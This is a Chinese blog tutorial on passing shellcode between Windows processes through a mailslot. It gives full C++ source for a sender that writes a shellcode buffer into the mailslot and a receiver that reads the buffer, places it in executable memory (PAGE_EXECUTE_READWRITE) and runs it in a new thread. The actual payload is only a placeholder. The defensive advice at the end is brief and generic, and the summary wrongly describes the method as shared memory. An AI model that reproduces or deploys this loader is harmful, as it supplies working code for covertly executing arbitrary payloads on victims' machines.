---
layout: post
title: 'C++ 邮件槽ShellCode跨进程传输'
date: "2023-12-08T01:01:51.013Z"
---
C++ 邮件槽ShellCode跨进程传输
=====================

在计算机安全领域，进程间通信（IPC）一直是一个备受关注的话题。在本文中，我们将探讨如何使用Windows邮件槽（Mailslot）实现ShellCode的跨进程传输。邮件槽提供了一种简单而有效的单向通信机制，使得任何进程都能够成为邮件槽服务器，并通过\`UDP\`通信向其他进程发送数据。邮件槽是Windows操作系统提供的一种用于本地进程间通信的机制。它允许一个进程创建一个命名的槽，并允许其他进程通过该槽向创建它的进程发送消息。在本文中，我们将使用邮件槽实现进程间的\`ShellCode\`传输。如果需要双向通信或更复杂的通信需求，需要考虑其他\`IPC\`机制，例如命名管道、套接字等。

在计算机安全领域，进程间通信（IPC）一直是一个备受关注的话题。在本文中，我们将探讨如何使用Windows邮件槽（Mailslot）实现ShellCode的跨进程传输。邮件槽提供了一种简单而有效的单向通信机制，使得任何进程都能够成为邮件槽服务器，并通过`UDP`通信向其他进程发送数据。

邮件槽是Windows操作系统提供的一种用于本地进程间通信的机制。它允许一个进程创建一个命名的槽，并允许其他进程通过该槽向创建它的进程发送消息。在本文中，我们将使用邮件槽实现进程间的`ShellCode`传输。如果需要双向通信或更复杂的通信需求，需要考虑其他`IPC`机制，例如命名管道、套接字等。

服务端部分
-----

服务端端部分的实现非常简单，通过使用`MAIL_SLOT_NAME` 可以定义邮件槽的名称，该名称用于标识服务端和客户端之间的邮件槽。这是一个字符串常量，按照 Windows 命名约定的格式指定了邮件槽的路径。

让我来解释这个定义的具体含义：

*   `\\\\.`：表示本地计算机，即当前计算机的命名空间。
*   `mailslot`：指定邮件槽的类型。
*   `Name`：是你给邮件槽指定的名称，可以根据实际需要更改。

所以，整个路径 `\\\\.\\mailslot\\Name` 指代的是一个本地计算机上的邮件槽，其名称为 `Name`。这个路径会在创建和打开邮件槽时使用，确保两个进程使用相同的路径来通信。

在服务端创建邮件槽时，通过 `CreateFile` 函数中的 `MAIL_SLOT_NAME` 参数指定邮件槽的名称，确保服务端和客户端使用相同的名称来建立通信连接。

**CreateFile**

用于创建或打开文件、文件夹、邮件槽、管道等对象的句柄。在你提供的代码中，`CreateFile` 主要用于打开邮件槽，以便在服务端写入数据。

以下是 `CreateFile` 函数的一般形式：

    HANDLE CreateFile(
      LPCTSTR               lpFileName,
      DWORD                 dwDesiredAccess,
      DWORD                 dwShareMode,
      LPSECURITY_ATTRIBUTES lpSecurityAttributes,
      DWORD                 dwCreationDisposition,
      DWORD                 dwFlagsAndAttributes,
      HANDLE                hTemplateFile
    );
    

参数说明：

*   `lpFileName`：指定文件或对象的名称，可以是一个路径、文件名或其他标识符。
*   `dwDesiredAccess`：指定对文件的访问权限，例如 `GENERIC_READ`、`GENERIC_WRITE` 等。
*   `dwShareMode`：指定共享模式，例如 `FILE_SHARE_READ`、`FILE_SHARE_WRITE` 等。
*   `lpSecurityAttributes`：指定安全属性，通常设置为 `NULL`。
*   `dwCreationDisposition`：指定文件的创建或打开方式，例如 `OPEN_EXISTING`、`CREATE_NEW` 等。
*   `dwFlagsAndAttributes`：指定文件或对象的属性，例如 `FILE_ATTRIBUTE_NORMAL`。
*   `hTemplateFile`：指定一个文件句柄，用于复制文件属性。

如上所示，我们只需要遵循邮件槽的创建流程并使用`CreateFile`创建通信，当需要传输邮件的时候可以直接调用`WriteFile`发送邮件，这是一个很好的功能，你可以发送邮件也可以发送各种你喜欢的乱七八糟的东西。

    #include <windows.h>
    #include <iostream>
    
    using namespace std;
    
    #define MAIL_SLOT_NAME "\\\\.\\mailslot\\Name" 
    
    char ShellCode[] = "此处是ShellCode";
    
    int main(int argc, char* argv[])
    {
        HANDLE hWriteMailSlot = NULL;
        while (TRUE)
        {
            hWriteMailSlot = CreateFile(MAIL_SLOT_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hWriteMailSlot == INVALID_HANDLE_VALUE)
                continue;
            else
                break;
        }
        DWORD dwReturn = 0;
    
        // 发送邮件槽
        WriteFile(hWriteMailSlot, ShellCode, strlen(ShellCode), &dwReturn, NULL);
        CloseHandle(hWriteMailSlot);
        return 0;
    }
    

客户端部分
-----

为了实现通信，客户端部分也需要使用邮件槽，在`MAIL_SLOT_NAME`中指定相同的邮件名，通过`CreateMailslot` 函数，创建邮件槽（Mailslot），这是一种用于本地进程间通信的机制。邮件槽是一种命名的管道，用于在同一台计算机上的不同进程之间传递数据。

以下是 `CreateMailslot` 函数的一般形式：

    HANDLE CreateMailslot(
      LPCTSTR               lpName,
      DWORD                 nMaxMessageSize,
      DWORD                 lReadTimeout,
      LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );
    

参数说明：

*   `lpName`：指定邮件槽的名称，形如 `\\.\mailslot\your_mailslot_name`。
*   `nMaxMessageSize`：指定邮件槽中消息的最大大小。
*   `lReadTimeout`：指定在读取数据时的超时时间（以毫秒为单位）。
*   `lpSecurityAttributes`：指定邮件槽的安全属性，可以为 `NULL`。

在代码中，`CreateMailslot` 用于创建邮件槽：

    hReadMailSlot = CreateMailslot(MAIL_SLOT_NAME, 0, 0, NULL);
    

这行代码的作用是创建一个邮件槽，使用了预定义的邮件槽名称 `MAIL_SLOT_NAME` 作为参数，`nMaxMessageSize` 和 `lReadTimeout` 都设置为零，表示使用默认值。如果创建成功，`hReadMailSlot` 将获得一个有效的邮件槽句柄，可以用于后续的数据读取操作。

创建好链接之后接下来就可以通过`GetMailslotInfo`函数获取邮件了，当然了这个要死循环等待邮件，`GetMailslotInfo` 用于检查邮件槽的状态信息。它提供了有关邮件槽当前状态的信息，例如有多少消息在邮件槽中、每个消息的大小等。

以下是 `GetMailslotInfo` 函数的一般形式：

    BOOL GetMailslotInfo(
      HANDLE       hMailslot,
      LPDWORD      lpMaxMessageSize,
      LPDWORD      lpNextSize,
      LPDWORD      lpMessageCount,
      LPDWORD      lpReadTimeout
    );
    

参数说明：

*   `hMailslot`：邮件槽的句柄，通过 `CreateMailslot` 函数或 `CreateFile` 函数获得。
*   `lpMaxMessageSize`：指向一个变量，用于接收邮件槽中单个消息的最大大小。
*   `lpNextSize`：指向一个变量，用于接收下一个消息的大小。
*   `lpMessageCount`：指向一个变量，用于接收邮件槽中当前的消息数目。
*   `lpReadTimeout`：指向一个变量，用于接收在读取数据时的超时时间（以毫秒为单位）。

在你的代码中，`GetMailslotInfo` 用于获取邮件槽的信息：

    bOk = GetMailslotInfo(hReadMailSlot, NULL, &cbMessage, &cMessage, NULL);
    

这行代码的作用是获取邮件槽 `hReadMailSlot` 的信息，其中 `cbMessage` 接收消息的大小，`cMessage` 接收消息的数量。这样的信息可以在接收方确定是否有待处理的消息，以及处理这些消息所需的空间。

一般来说当收到了新邮件之后可以直接使用`ReadFile`函数读出这段邮件，读出来的邮件就可以直接反弹了，如下代码所示；

    #include <windows.h>
    #include <iostream>
    
    using namespace std;
    
    #define MAIL_SLOT_NAME "\\\\.\\mailslot\\Name" 
    HANDLE hReadMailSlot = INVALID_HANDLE_VALUE;
    
    DWORD WINAPI ReadMail()
    {
        hReadMailSlot = CreateMailslot(MAIL_SLOT_NAME, 0, 0, NULL);
        if (hReadMailSlot == INVALID_HANDLE_VALUE)
        {
            return -1;
        }
    
        // 查看油槽的信息
        DWORD cbMessage = 0, dwReturn = 0, cMessage = 0;
        BOOL bOk = FALSE;
    
        char ShellCode[4096] = { 0 };
    
        while (TRUE)
        {
            bOk = GetMailslotInfo(hReadMailSlot, NULL, &cbMessage, &cMessage, NULL);
            if (bOk == FALSE)
                break;
            if (cMessage == 0)
                continue;
            else
            {
                if (ReadFile(hReadMailSlot, ShellCode, cbMessage, &dwReturn, 0) == TRUE)
                {
                    HANDLE hThread = NULL;
                    cout << ShellCode << endl;
                    
                    // 注入ShellCode并执行
                    void* ptr = VirtualAlloc(0, sizeof(ShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    CopyMemory(ptr, ShellCode, sizeof(ShellCode));
    
                    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ptr, 0, 0, 0);
                    WaitForSingleObject(hThread, INFINITE);
                }
            }
        }
    }
    
    int main(int argc, char* argv[])
    {
        HANDLE hReadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadMail, NULL, 0, NULL);
        Sleep(INFINITE);
        if (hReadMailSlot != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hReadMailSlot);
        }
        return 0;
    }
    

### 潜在风险和安全建议

虽然这种方法在本地攻击场景中有一定的巧妙性，但也存在潜在的风险。以下是一些建议：

1.  **防御共享内存滥用：** 操作系统提供了一些机制，如使用 ACL（访问控制列表）和安全描述符，可以限制对共享内存的访问。合理配置这些机制可以减轻潜在的滥用风险。
2.  **加强系统安全策略：** 使用强密码、及时更新系统和应用程序、启用防火墙等都是基础的系统安全策略。这些都有助于防止潜在的Shellcode攻击。
3.  **监控和响应：** 部署实时监控和响应系统，能够及时检测到异常行为并采取相应措施，对于减缓潜在威胁的影响十分重要。

### 总结

本文介绍了通过共享内存传递Shellcode的方法，通过这种巧妙的本地攻击方式，两个进程可以在不直接通信的情况下相互传递Shellcode。然而，使用这种技术需要非常谨慎，以免被滥用用于不当用途。在实际应用中，必须谨慎权衡安全性和便利性，同时配合其他防御措施，确保系统的整体安全性。

**文章出处：**[https://www.cnblogs.com/LyShark/p/17883618.html](https://www.cnblogs.com/LyShark/p/17883618.html)  
本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！




